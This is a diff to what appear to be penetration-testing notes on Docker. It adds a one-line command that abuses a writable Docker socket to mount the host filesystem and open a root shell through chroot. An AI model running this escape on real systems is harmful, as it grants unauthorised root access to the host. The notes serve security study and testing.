@@ -67,11 +67,10 @@ Using coker images in the system
 docker image ls
 ```
 
-# Docker Socket
-
-
+## Docker Socket
+Finding a docker soccket writeable "/var/run/docker.sock"
 ```
-
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 ```
 
 # Disk
